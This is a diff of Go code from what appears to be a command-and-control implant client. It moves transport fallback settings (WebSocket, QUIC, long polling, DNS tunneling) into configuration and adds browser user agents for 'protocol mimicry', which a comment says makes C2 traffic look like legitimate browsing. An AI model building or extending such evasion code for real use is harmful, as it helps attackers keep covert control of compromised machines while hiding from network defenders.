@@ -15,7 +15,17 @@ import (
 // connectWithFallback attempts to connect using transport fallback mechanism
 // Priority: WS → WSS → QUIC → Long Polling → DNS
 func connectWithFallback(ctx context.Context) (*common.Conn, error) {
-	// Build transport configuration
+	// Build transport configuration from client config
+	dnsServer := config.Config.DNSServer
+	if dnsServer == "" {
+		dnsServer = "8.8.8.8:53" // Default to Google DNS
+	}
+
+	quicPort := config.Config.QUICPort
+	if quicPort == 0 {
+		quicPort = 443 // Default QUIC port
+	}
+
 	cfg := &transport.Config{
 		ServerURL:  config.GetBaseURL(true),
 		UUID:       config.Config.UUID,
@@ -29,25 +39,26 @@ func connectWithFallback(ctx context.Context) (*common.Conn, error) {
 		// TLS settings
 		InsecureSkipVerify: true, // Accept self-signed certificates
 
-		// DNS tunneling config (if enabled)
-		DNSServer: "8.8.8.8:53",
-		DNSDomain: config.Config.DNSTunnelDomain, // Add this to config
+		// DNS tunneling config
+		DNSServer: dnsServer,
+		DNSDomain: config.Config.DNSTunnelDomain,
 
 		// Long polling config
 		LongPollTimeout: 30 * time.Second,
 		LongPollPath:    "/api/longpoll",
 
 		// QUIC config
-		QUICEnabled: config.Config.EnableQUIC, // Add this to config
-		QUICPort:    443,
+		QUICEnabled: config.Config.EnableQUIC,
+		QUICPort:    quicPort,
 
-		// Protocol mimicry
+		// Protocol mimicry (makes C2 traffic appear as legitimate web browsing)
 		Mimicry: &transport.ProtocolMimicryConfig{
-			Enabled: config.Config.EnableMimicry, // Add this to config
+			Enabled: config.Config.EnableMimicry,
 			UserAgents: []string{
 				"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 				"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+				"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
 			},
 			Headers: map[string]string{
 				"Accept-Language": "en-US,en;q=0.9",
@@ -81,13 +92,10 @@ func connectWithFallback(ctx context.Context) (*common.Conn, error) {
 	return conn, nil
 }
 
-// enableTransportFallback is a feature flag to enable/disable new transport system
-// Set to true to use new fallback transports, false to use legacy WebSocket only
-var enableTransportFallback = true
-
 // connectWithAutoFallback automatically chooses between new and legacy connection methods
+// Uses config.Config.EnableTransportFallback to determine behavior
 func connectWithAutoFallback(ctx context.Context) (*common.Conn, error) {
-	if enableTransportFallback {
+	if config.Config.EnableTransportFallback {
 		return connectWithFallback(ctx)
 	}
 	// Legacy WebSocket-only connection
